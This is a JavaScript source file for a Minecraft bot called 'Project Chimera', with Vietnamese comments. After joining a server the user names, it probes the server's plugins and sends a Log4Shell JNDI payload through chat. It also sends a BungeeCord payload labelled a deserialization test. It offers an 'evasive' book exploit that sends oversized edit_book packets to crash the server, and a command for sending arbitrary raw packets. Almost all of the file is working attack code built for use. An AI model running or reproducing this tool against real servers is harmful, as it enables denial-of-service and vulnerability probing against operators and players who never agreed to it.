// file: project_chimera_v6.js

const mineflayer = require('mineflayer');
const readline = require('readline');
const { Vec3 } = require('vec3');

// --- SETUP GIAO DIỆN CONSOLE ---
const rl = readline.createInterface({ 
    input: process.stdin, 
    output: process.stdout,
    prompt: '> ' // Dấu nhắc lệnh
});

// --- UTILITY: HÀM TẠO ĐỘ TRỄ ---
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ================================================================= //
// MODULE 1: RECONNAISSANCE (TRINH SÁT)
// ================================================================= //
async function performRecon(bot) {
    console.log('\x1b[36m%s\x1b[0m', '--- Giai đoạn 1: Bắt đầu Trinh sát ---');
    
    // 1. Lấy thông tin Server Brand (chỉ chạy một lần)
    bot._client.once('brand', (brand) => {
        console.log(`[RECON] Server Brand: ${brand}`);
    });
    // Gửi yêu cầu brand ngay lập tức
    bot._client.write('brand', { brand: 'mineflayer' });


    // 2. Thử lấy danh sách Plugin
    console.log('[RECON] Đang thử các lệnh để lấy danh sách plugin...');
    const commandsToTry = ['pl', 'plugins', 'bukkit:pl', 'bukkit:plugins', '?'];
    for (const cmd of commandsToTry) {
        bot.chat(`/${cmd}`);
        await sleep(500); // Chờ phản hồi
    }
    console.log('[RECON] Đã gửi các lệnh thăm dò. Hãy xem log chat để biết kết quả.');
}

// ================================================================= //
// MODULE 2: AUTOMATED VULNERABILITY SCANNING (QUÉT LỖ HỔNG)
// ================================================================= //
async function performAutoScan(bot) {
    console.log('\x1b[36m%s\x1b[0m', '--- Giai đoạn 2: Bắt đầu Quét Lỗ hổng Tự động ---');
    
    // 1. Test Log4Shell (vô hại, payload không trỏ đến server thật)
    console.log('[AUTOSCAN] Đang kiểm tra Log4Shell...');
    const log4shellPayload = `\${jndi:ldap://log4j.bot-test.${Math.random()}.com/a}`; // Thêm số ngẫu nhiên để tránh cache DNS
    bot.chat(log4shellPayload);
    console.log('[AUTOSCAN] Đã gửi payload. Hãy kiểm tra console server xem có lỗi "Error looking up JNDI resource" không.');
    await sleep(500);

    // 2. Test Deserialization cũ trên kênh BungeeCord
    console.log('[AUTOSCAN] Đang kiểm tra lỗ hổng Deserialization cũ...');
    try {
        const fakePayload = Buffer.from("Chimera test payload");
        bot._client.write('custom_payload', { channel: 'BungeeCord', data: fakePayload });
        console.log('[AUTOSCAN] Đã gửi payload qua kênh BungeeCord.');
    } catch (e) { /* Bỏ qua lỗi nếu kênh không tồn tại */ }
}

// ================================================================= //
// MODULE 3: EVASIVE ATTACKS (TẤN CÔNG NÉ TRÁNH)
// ================================================================= //
async function evasiveBookExploit(bot) {
    try {
        console.log('\x1b[31m%s\x1b[0m', '[ATTACK] Bắt đầu Book Exploit (Chế độ Humanizer)...');
        const book = bot.inventory.findInventoryItem('writable_book');
        if (!book) throw new Error('Không tìm thấy "Book and Quill".');

        // Mô phỏng click chuột với độ trễ
        await bot.equip(book, 'hand'); 
        console.log('[HUMANIZER] Giả vờ suy nghĩ trước khi viết...');
        await sleep(300 + Math.random() * 200); 

        const pages = Array(50).fill('{"text":"' + 'CRASH '.repeat(8000) + '"}');
        bot._client.write('edit_book', { hand: 0, pages: pages, title: 'The Final Chapter' });
        console.log('\x1b[31m%s\x1b[0m', '>>> Gói tin Book Exploit đã được gửi đi!');
    } catch (err) {
        console.error('\x1b[31m%s\x1b[0m', `[LỖI] Book Exploit thất bại: ${err.message}`);
    }
}

// ================================================================= //
// MODULE 4: DYNAMIC EXPLOITATION (KHAI THÁC ĐỘNG)
// ================================================================= //
function sendRawPacket(bot, packetName, packetData) {
    try {
        const data = JSON.parse(packetData);
        console.log(`[RAW] Đang gửi gói tin '${packetName}' với dữ liệu:`, data);
        bot._client.write(packetName, data);
        console.log('[RAW] Gói tin đã được gửi.');
    } catch (e) {
        console.error(`[LỖI RAW] Không thể gửi gói tin: ${e.message}. Dữ liệu có phải là JSON hợp lệ không?`);
    }
}


// --- COMMAND CENTER ---
function setupCommandHandler(bot) {
  rl.on('line', (line) => {
    rl.pause(); // Tạm dừng để xử lý, tránh input chồng chéo
    const args = line.trim().split(' ');
    const command = args.shift().toLowerCase();

    // Dùng promise để xử lý các lệnh bất đồng bộ và prompt lại sau khi xong
    Promise.resolve().then(async () => {
        switch(command) {
            case '!book': 
                await evasiveBookExploit(bot); 
                break;
            case '!raw': 
                if (args.length < 2) {
                    console.log("Sử dụng: !raw <tên_packet> '<dữ_liệu_json>'");
                    console.log("Ví dụ: !raw chat '{\"message\":\"Hello\"}'");
                } else {
                    const packetName = args.shift();
                    const packetData = args.join(' ');
                    sendRawPacket(bot, packetName, packetData);
                }
                break;
            case '!help':
                console.log(`
--- Project Chimera Help ---
!book           : (Crash) Thực hiện Book Exploit với chế độ né tránh.
!raw <name> <json>: (Advanced) Gửi một gói tin thô tùy chỉnh.
<bất cứ gì khác>: Sẽ được gửi dưới dạng chat trong game.
!quit           : Thoát bot.
----------------------------`);
                break;
            case '!quit':
                bot.quit(); 
                break;
            default: 
                // Nếu không phải lệnh nào ở trên, gửi như một tin nhắn chat
                bot.chat(line);
        }
    }).finally(() => {
        if (bot.state !== 'disconnected') {
            rl.resume();
            rl.prompt();
        }
    });
  });
}

// --- MAIN BOT FUNCTION ---
async function startBot(config) {
    const bot = mineflayer.createBot({ ...config });

    bot.once('spawn', async () => {
        console.log('\x1b[32m%s\x1b[0m', `>>> Project Chimera đã vào game! Bắt đầu thực hiện các giai đoạn...`);
        rl.prompt();
        
        try {
            await performRecon(bot);
            await sleep(2000);
            await performAutoScan(bot);
        } catch (e) {
            console.error('[LỖI GIAI ĐOẠN TỰ ĐỘNG]:', e.message);
        }

        console.log('\x1b[32m%s\x1b[0m', '--- Các giai đoạn tự động đã hoàn tất. Bot sẵn sàng nhận lệnh thủ công. Gõ !help. ---');
        setupCommandHandler(bot);
    });
    
    // --- ROBUST EVENT HANDLERS ---
    bot.on('chat', (username, message) => {
        if (username === bot.username) return;
        readline.cursorTo(process.stdout, 0); // Di chuyển con trỏ về đầu dòng
        console.log(`\r<${username}> ${message}`); // In tin nhắn và \r để ghi đè dấu nhắc lệnh
        rl.prompt(true); // Hiển thị lại dấu nhắc lệnh
    });

    bot.on('kicked', (reason, loggedIn) => {
        console.log('\n\x1b[31m%s\x1b[0m', '>>> BOT ĐÃ BỊ KICK! <<<');
        let reasonText = reason;
        try {
            reasonText = mineflayer.ChatMessage.fromNotch(reason).toString();
        } catch (e) { /* Không sao, dùng chuỗi thô */ }
        console.log('\x1b[31m%s\x1b[0m', `Lý do: ${reasonText}`);
        process.exit(1);
    });

    bot.on('error', (err) => console.log('\n\x1b[31m%s\x1b[0m', `>>> Lỗi Bot: ${err.message || err}`));
    bot.on('end', (reason) => { 
        console.log('\n\x1b[33m%s\x1b[0m', `>>> Mất kết nối. Lý do: ${reason}`); 
        process.exit(0);
    });
}

// --- INITIALIZATION SCRIPT ---
console.log('--- Project Chimera (v6 - God Tier) by You ---');
rl.question('Server (ip:port): ', (address) => {
    rl.question('Tên Bot: ', (username) => {
        rl.question('Phiên bản (trống để auto): ', (version) => {
            const [host, portStr] = address.split(':');
            startBot({ 
                host: host, 
                port: parseInt(portStr) || 25565, 
                username: username || 'Chimera', 
                version: version || false,
                checkTimeoutInterval: 60 * 1000 // Tăng timeout để tránh bị ngắt kết nối khi server lag
            });
        });
    });
});
